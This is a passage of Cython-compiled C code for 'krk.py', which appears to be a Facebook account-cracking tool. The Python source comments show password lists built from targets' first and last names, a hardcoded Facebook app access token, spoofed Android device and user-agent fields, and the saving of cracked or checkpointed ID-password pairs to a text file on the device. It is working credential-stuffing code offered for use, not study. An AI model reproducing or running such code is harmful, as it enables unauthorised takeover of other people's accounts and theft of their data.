                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_5, function);
                __pyx_t_10 = 1;
              }
            }
            {
              PyObject *__pyx_callargs[2] = {__pyx_t_17, __pyx_t_9};
              __pyx_t_6 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_10, 1+__pyx_t_10);
              __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
              __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
              if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 576, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_6);
              __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            }
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

            /* "krk.py":577
 *                                         else:
 *                                                 open('/sdcard/ZEA-CP.txt','a').write(ids+'|'+pas+'\n')
 *                                                 break             # <<<<<<<<<<<<<<
 *                                                 cps.append(ids)
 *                         else:
 */
            goto __pyx_L18_break;
          }

          /* "krk.py":569
 *                                                 twf.append(ids)
 *                                                 break
 *                         elif 'www.facebook.com' in po['error_msg']:             # <<<<<<<<<<<<<<
 *                                         if 'y' in pcp:
 *                                                 print('\r\r\x1b[1;36m [ZEA-CP] '+ids+' | '+pas+'\033[1;97m')
 */
        }

        /* "krk.py":580
 *                                                 cps.append(ids)
 *                         else:
 *                                 continue             # <<<<<<<<<<<<<<
 *                 loop+=1
 *         except Exception as e:
 */
        /*else*/ {
          goto __pyx_L17_continue;
        }
        __pyx_L19:;

        /* "krk.py":497
 *                 except:
 *                         ln = fn
 *                 for pw in passlist:             # <<<<<<<<<<<<<<
 *                         pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 */
        __pyx_L17_continue:;
      }
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      goto __pyx_L22_for_end;
      __pyx_L18_break:;
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      goto __pyx_L22_for_end;
      __pyx_L22_for_end:;

      /* "krk.py":581
 *                         else:
 *                                 continue
 *                 loop+=1             # <<<<<<<<<<<<<<
 *         except Exception as e:
 *                 pass
 */
      __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_loop); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 581, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_6 = __Pyx_PyInt_AddObjC(__pyx_t_7, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 581, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_loop, __pyx_t_6) < 0) __PYX_ERR(0, 581, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

      /* "krk.py":489
 *                 pass
 * def api1(ids,names,passlist):
 *         try:             # <<<<<<<<<<<<<<
 *                 global ok,loop,sim_id
 *                 sys.stdout.write('\r\r\033[1;37m [ZEA-XD-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 */
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
    __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
    __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
    __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
    __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
    __Pyx_XDECREF(__pyx_t_20); __pyx_t_20 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    /* "krk.py":582
 *                                 continue
 *                 loop+=1
 *         except Exception as e:             # <<<<<<<<<<<<<<
 *                 pass
 * def rndm(ids,passlist):
 */
    __pyx_t_10 = __Pyx_PyErr_ExceptionMatches(((PyObject *)(&((PyTypeObject*)PyExc_Exception)[0])));
    if (__pyx_t_10) {
      __Pyx_AddTraceback("krk.api1", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_6, &__pyx_t_7, &__pyx_t_5) < 0) __PYX_ERR(0, 582, __pyx_L5_except_error)
      __Pyx_XGOTREF(__pyx_t_6);
      __Pyx_XGOTREF(__pyx_t_7);
      __Pyx_XGOTREF(__pyx_t_5);
      __Pyx_INCREF(__pyx_t_7);
      __pyx_v_e = __pyx_t_7;
      /*try:*/ {
      }
      /*finally:*/ {
        /*normal exit:*/{
          __Pyx_DECREF(__pyx_v_e); __pyx_v_e = 0;
          goto __pyx_L29;
        }
        __pyx_L29:;
      }
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;

    /* "krk.py":489
 *                 pass
 * def api1(ids,names,passlist):
 *         try:             # <<<<<<<<<<<<<<
 *                 global ok,loop,sim_id
 *                 sys.stdout.write('\r\r\033[1;37m [ZEA-XD-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 */
    __pyx_L5_except_error:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  /* "krk.py":488
 *         except Exception as e:
 *                 pass
 * def api1(ids,names,passlist):             # <<<<<<<<<<<<<<
 *         try:
 *                 global ok,loop,sim_id
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_XDECREF(__pyx_t_15);
  __Pyx_XDECREF(__pyx_t_16);
  __Pyx_XDECREF(__pyx_t_17);
  __Pyx_XDECREF(__pyx_t_18);
  __Pyx_XDECREF(__pyx_t_19);
  __Pyx_XDECREF(__pyx_t_20);
  __Pyx_AddTraceback("krk.api1", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_fn);
  __Pyx_XDECREF(__pyx_v_ln);
  __Pyx_XDECREF(__pyx_v_pw);
  __Pyx_XDECREF(__pyx_v_pas);
  __Pyx_XDECREF(__pyx_v_accessToken);
  __Pyx_XDECREF(__pyx_v_fbav);
  __Pyx_XDECREF(__pyx_v_fbbv);
  __Pyx_XDECREF(__pyx_v_android_version);
  __Pyx_XDECREF(__pyx_v_model);
  __Pyx_XDECREF(__pyx_v_build);
  __Pyx_XDECREF(__pyx_v_fblc);
  __Pyx_XDECREF(__pyx_v_fbcr);
  __Pyx_XDECREF(__pyx_v_fbmf);
  __Pyx_XDECREF(__pyx_v_fbbd);
  __Pyx_XDECREF(__pyx_v_fbdv);
  __Pyx_XDECREF(__pyx_v_fbsv);
  __Pyx_XDECREF(__pyx_v_fbca);
  __Pyx_XDECREF(__pyx_v_fbdm);
  __Pyx_XDECREF(__pyx_v_fbfw);
  __Pyx_XDECREF(__pyx_v_fbrv);
  __Pyx_XDECREF(__pyx_v_fban);
  __Pyx_XDECREF(__pyx_v_fbpn);
  __Pyx_XDECREF(__pyx_v_ua);
  __Pyx_XDECREF(__pyx_v_random_seed);
  __Pyx_XDECREF(__pyx_v_adid);
  __Pyx_XDECREF(__pyx_v_device_id);
  __Pyx_XDECREF(__pyx_v_secure);
  __Pyx_XDECREF(__pyx_v_family);
  __Pyx_XDECREF(__pyx_v_xd);
  __Pyx_XDECREF(__pyx_v_sim_serials);
  __Pyx_XDECREF(__pyx_v_li);
  __Pyx_XDECREF(__pyx_v_li2);
  __Pyx_XDECREF(__pyx_v_j1);
  __Pyx_XDECREF(__pyx_v_jazoest);
  __Pyx_XDECREF(__pyx_v_data);
  __Pyx_XDECREF(__pyx_v_headers);
  __Pyx_XDECREF(__pyx_v_url);
  __Pyx_XDECREF(__pyx_v_twf);
  __Pyx_XDECREF(__pyx_v_po);
  __Pyx_XDECREF(__pyx_v_e);
  __Pyx_XDECREF(__pyx_gb_3krk_4api1_2generator5);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "krk.py":584
 *         except Exception as e:
 *                 pass
 * def rndm(ids,passlist):             # <<<<<<<<<<<<<<
 *         global loop
 *         global oks
 */

/* Python wrapper */
static PyObject *__pyx_pw_3krk_19rndm(PyObject *__pyx_self, 
#if CYTHON_METH_FASTCALL
PyObject *const *__pyx_args, Py_ssize_t __pyx_nargs, PyObject *__pyx_kwds
#else
PyObject *__pyx_args, PyObject *__pyx_kwds
#endif
); /*proto*/
static PyMethodDef __pyx_mdef_3krk_19rndm = {"rndm", (PyCFunction)(void*)(__Pyx_PyCFunction_FastCallWithKeywords)__pyx_pw_3krk_19rndm, __Pyx_METH_FASTCALL|METH_KEYWORDS, 0};
static PyObject *__pyx_pw_3krk_19rndm(PyObject *__pyx_self, 
#if CYTHON_METH_FASTCALL
PyObject *const *__pyx_args, Py_ssize_t __pyx_nargs, PyObject *__pyx_kwds
#else
PyObject *__pyx_args, PyObject *__pyx_kwds
#endif
) {
  PyObject *__pyx_v_ids = 0;
  PyObject *__pyx_v_passlist = 0;
  #if !CYTHON_METH_FASTCALL
  CYTHON_UNUSED const Py_ssize_t __pyx_nargs = PyTuple_GET_SIZE(__pyx_args);
  #endif
  CYTHON_UNUSED PyObject *const *__pyx_kwvalues = __Pyx_KwValues_FASTCALL(__pyx_args, __pyx_nargs);
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("rndm (wrapper)", 0);
  {
    PyObject **__pyx_pyargnames[] = {&__pyx_n_s_ids,&__pyx_n_s_passlist,0};
    PyObject* values[2] = {0,0};
    if (__pyx_kwds) {
      Py_ssize_t kw_args;
      switch (__pyx_nargs) {
        case  2: values[1] = __Pyx_Arg_FASTCALL(__pyx_args, 1);
        CYTHON_FALLTHROUGH;
        case  1: values[0] = __Pyx_Arg_FASTCALL(__pyx_args, 0);
        CYTHON_FALLTHROUGH;
        case  0: break;
        default: goto __pyx_L5_argtuple_error;
      }
      kw_args = __Pyx_NumKwargs_FASTCALL(__pyx_kwds);
      switch (__pyx_nargs) {
        case  0:
        if (likely((values[0] = __Pyx_GetKwValue_FASTCALL(__pyx_kwds, __pyx_kwvalues, __pyx_n_s_ids)) != 0)) kw_args--;
        else if (unlikely(PyErr_Occurred())) __PYX_ERR(0, 584, __pyx_L3_error)
        else goto __pyx_L5_argtuple_error;
        CYTHON_FALLTHROUGH;
        case  1:
        if (likely((values[1] = __Pyx_GetKwValue_FASTCALL(__pyx_kwds, __pyx_kwvalues, __pyx_n_s_passlist)) != 0)) kw_args--;
        else if (unlikely(PyErr_Occurred())) __PYX_ERR(0, 584, __pyx_L3_error)
        else {
          __Pyx_RaiseArgtupleInvalid("rndm", 1, 2, 2, 1); __PYX_ERR(0, 584, __pyx_L3_error)
        }
      }
      if (unlikely(kw_args > 0)) {
        const Py_ssize_t kwd_pos_args = __pyx_nargs;
        if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_kwvalues, __pyx_pyargnames, 0, values + 0, kwd_pos_args, "rndm") < 0)) __PYX_ERR(0, 584, __pyx_L3_error)
      }
    } else if (unlikely(__pyx_nargs != 2)) {
      goto __pyx_L5_argtuple_error;
    } else {
      values[0] = __Pyx_Arg_FASTCALL(__pyx_args, 0);
      values[1] = __Pyx_Arg_FASTCALL(__pyx_args, 1);
    }
    __pyx_v_ids = values[0];
    __pyx_v_passlist = values[1];
  }
  goto __pyx_L4_argument_unpacking_done;
  __pyx_L5_argtuple_error:;
  __Pyx_RaiseArgtupleInvalid("rndm", 1, 2, 2, __pyx_nargs); __PYX_ERR(0, 584, __pyx_L3_error)
  __pyx_L3_error:;
  __Pyx_AddTraceback("krk.rndm", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __Pyx_RefNannyFinishContext();
  return NULL;
  __pyx_L4_argument_unpacking_done:;
  __pyx_r = __pyx_pf_3krk_18rndm(__pyx_self, __pyx_v_ids, __pyx_v_passlist);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}
static PyObject *__pyx_gb_3krk_4rndm_2generator6(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value); /* proto */

/* "krk.py":619
 *                         li = ['28','29','210']
 *                         li2 = random.choice(li)
 *                         j1 = ''.join(random.choice(digits) for _ in range(2))             # <<<<<<<<<<<<<<
 *                         jazoest = li2+j1
 *                         data = {
 */

static PyObject *__pyx_pf_3krk_4rndm_genexpr(CYTHON_UNUSED PyObject *__pyx_self) {
  struct __pyx_obj_3krk___pyx_scope_struct_6_genexpr *__pyx_cur_scope;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("genexpr", 0);
  __pyx_cur_scope = (struct __pyx_obj_3krk___pyx_scope_struct_6_genexpr *)__pyx_tp_new_3krk___pyx_scope_struct_6_genexpr(__pyx_ptype_3krk___pyx_scope_struct_6_genexpr, __pyx_empty_tuple, NULL);
  if (unlikely(!__pyx_cur_scope)) {
    __pyx_cur_scope = ((struct __pyx_obj_3krk___pyx_scope_struct_6_genexpr *)Py_None);
    __Pyx_INCREF(Py_None);
    __PYX_ERR(0, 619, __pyx_L1_error)
  } else {
    __Pyx_GOTREF((PyObject *)__pyx_cur_scope);
  }
  {
    __pyx_CoroutineObject *gen = __Pyx_Generator_New((__pyx_coroutine_body_t) __pyx_gb_3krk_4rndm_2generator6, NULL, (PyObject *) __pyx_cur_scope, __pyx_n_s_genexpr, __pyx_n_s_rndm_locals_genexpr, __pyx_n_s_krk); if (unlikely(!gen)) __PYX_ERR(0, 619, __pyx_L1_error)
    __Pyx_DECREF(__pyx_cur_scope);
    __Pyx_RefNannyFinishContext();
    return (PyObject *) gen;
  }

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_AddTraceback("krk.rndm.genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __Pyx_DECREF((PyObject *)__pyx_cur_scope);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_gb_3krk_4rndm_2generator6(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value) /* generator body */
{
  struct __pyx_obj_3krk___pyx_scope_struct_6_genexpr *__pyx_cur_scope = ((struct __pyx_obj_3krk___pyx_scope_struct_6_genexpr *)__pyx_generator->closure);
  PyObject *__pyx_r = NULL;
  long __pyx_t_1;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  int __pyx_t_6;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("genexpr", 0);
  switch (__pyx_generator->resume_label) {
    case 0: goto __pyx_L3_first_run;
    case 1: goto __pyx_L6_resume_from_yield;
    default: /* CPython raises the right error here */
    __Pyx_RefNannyFinishContext();
    return NULL;
  }
  __pyx_L3_first_run:;
  if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 619, __pyx_L1_error)
  for (__pyx_t_1 = 0; __pyx_t_1 < 2; __pyx_t_1+=1) {
    __pyx_cur_scope->__pyx_v__ = __pyx_t_1;
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 619, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_choice); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 619, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_digits); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 619, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_5 = NULL;
    __pyx_t_6 = 0;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
      __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
      if (likely(__pyx_t_5)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
        __Pyx_INCREF(__pyx_t_5);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_4, function);
        __pyx_t_6 = 1;
      }
    }
    {
      PyObject *__pyx_callargs[2] = {__pyx_t_5, __pyx_t_3};
      __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_6, 1+__pyx_t_6);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 619, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    }
    __pyx_r = __pyx_t_2;
    __pyx_t_2 = 0;
    __pyx_cur_scope->__pyx_t_0 = __pyx_t_1;
    __Pyx_XGIVEREF(__pyx_r);
    __Pyx_RefNannyFinishContext();
    __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
    /* return from generator, yielding value */
    __pyx_generator->resume_label = 1;
    return __pyx_r;
    __pyx_L6_resume_from_yield:;
    __pyx_t_1 = __pyx_cur_scope->__pyx_t_0;
    if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 619, __pyx_L1_error)
  }
  CYTHON_MAYBE_UNUSED_VAR(__pyx_cur_scope);

  /* function exit code */
  PyErr_SetNone(PyExc_StopIteration);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_Generator_Replace_StopIteration(0);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_AddTraceback("genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_r); __pyx_r = 0;
  #if !CYTHON_USE_EXC_INFO_STACK
  __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
  #endif
  __pyx_generator->resume_label = -1;
  __Pyx_Coroutine_clear((PyObject*)__pyx_generator);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "krk.py":584
 *         except Exception as e:
 *                 pass
 * def rndm(ids,passlist):             # <<<<<<<<<<<<<<
 *         global loop
 *         global oks
 */

static PyObject *__pyx_pf_3krk_18rndm(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_ids, PyObject *__pyx_v_passlist) {
  PyObject *__pyx_v_pas = NULL;
  PyObject *__pyx_v_accessToken = NULL;
  PyObject *__pyx_v_fbav = NULL;
  PyObject *__pyx_v_fbbv = NULL;
  PyObject *__pyx_v_android_version = NULL;
  PyObject *__pyx_v_model = NULL;
  PyObject *__pyx_v_build = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_fblc = NULL;
  PyObject *__pyx_v_fbcr = NULL;
  PyObject *__pyx_v_fbmf = NULL;
  PyObject *__pyx_v_fbbd = NULL;
  PyObject *__pyx_v_fbdv = NULL;
  PyObject *__pyx_v_fbsv = NULL;
  PyObject *__pyx_v_fbca = NULL;
  PyObject *__pyx_v_fbdm = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_fbfw = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_fbrv = NULL;
  PyObject *__pyx_v_fban = NULL;
  PyObject *__pyx_v_fbpn = NULL;
  PyObject *__pyx_v_ua = NULL;
  PyObject *__pyx_v_random_seed = NULL;
  PyObject *__pyx_v_adid = NULL;
  PyObject *__pyx_v_device_id = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_secure = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_family = NULL;
  PyObject *__pyx_v_xd = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_sim_serials = NULL;
  PyObject *__pyx_v_li = NULL;
  PyObject *__pyx_v_li2 = NULL;
  PyObject *__pyx_v_j1 = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_jazoest = NULL;
  PyObject *__pyx_v_data = NULL;
  PyObject *__pyx_v_headers = NULL;
  PyObject *__pyx_v_url = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_twf = NULL;
  PyObject *__pyx_v_po = NULL;
  PyObject *__pyx_v_uid = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_e = NULL;
  PyObject *__pyx_gb_3krk_4rndm_2generator6 = 0;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  Py_ssize_t __pyx_t_5;
  PyObject *__pyx_t_6 = NULL;
  int __pyx_t_7;
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  PyObject *(*__pyx_t_11)(PyObject *);
  Py_ssize_t __pyx_t_12;
  Py_UCS4 __pyx_t_13;
  PyObject *__pyx_t_14 = NULL;
  int __pyx_t_15;
  PyObject *__pyx_t_16 = NULL;
  PyObject *__pyx_t_17 = NULL;
  PyObject *__pyx_t_18 = NULL;
  int __pyx_t_19;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("rndm", 0);

  /* "krk.py":587
 *         global loop
 *         global oks
 *         sys.stdout.write('\r\r\033[1;37m [ZEA-R-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()             # <<<<<<<<<<<<<<
 *         try:
 *                 for pas in passlist:
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_sys); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 587, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_stdout); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 587, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_write); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 587, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_loop); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 587, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_oks); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 587, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_5 = PyObject_Length(__pyx_t_4); if (unlikely(__pyx_t_5 == ((Py_ssize_t)-1))) __PYX_ERR(0, 587, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = PyInt_FromSsize_t(__pyx_t_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 587, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_6 = PyTuple_New(2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 587, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_6, 1, __pyx_t_4);
  __pyx_t_3 = 0;
  __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyString_Format(__pyx_kp_s_1_37m_ZEA_R_M1_s_1_37mOK_s_1_37, __pyx_t_6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 587, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_6 = NULL;
  __pyx_t_7 = 0;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_6)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_6);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
      __pyx_t_7 = 1;
    }
  }
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_6, __pyx_t_4};
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_7, 1+__pyx_t_7);
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 587, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_sys); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 587, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_stdout); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 587, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_flush); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 587, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = NULL;
  __pyx_t_7 = 0;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
      __pyx_t_7 = 1;
    }
  }
  {
    PyObject *__pyx_callargs[1] = {__pyx_t_4, };
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 587, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "krk.py":588
 *         global oks
 *         sys.stdout.write('\r\r\033[1;37m [ZEA-R-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 *         try:             # <<<<<<<<<<<<<<
 *                 for pas in passlist:
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 */
  {
    __Pyx_PyThreadState_declare
